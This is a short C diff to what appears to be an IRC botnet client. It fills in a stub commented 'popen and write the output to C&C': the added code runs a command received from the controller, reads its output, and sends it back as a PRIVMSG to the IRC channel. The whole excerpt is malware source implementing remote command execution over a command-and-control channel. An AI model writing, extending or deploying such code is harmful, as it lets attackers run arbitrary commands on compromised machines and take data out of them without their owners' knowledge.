@@ -63,7 +63,14 @@ void et_main_loop(int socket, char *nick)
 			}
 			else
 			{
-				// popen and write the output to C&C
+				char cmd_output[512];
+				char cmd_message[1024];
+
+				FILE *output_file = popen(cmd, "r");
+				fgets(cmd_output, 512, output_file);
+				snprintf(cmd_message, 1024, "PRIVMSG %s :%s\r\n", IRC_CHANNEL, cmd_output);
+				send(socket, cmd_message, strlen(cmd_message), 0);
+				pclose(output_file);
 			}
 		}
 	}
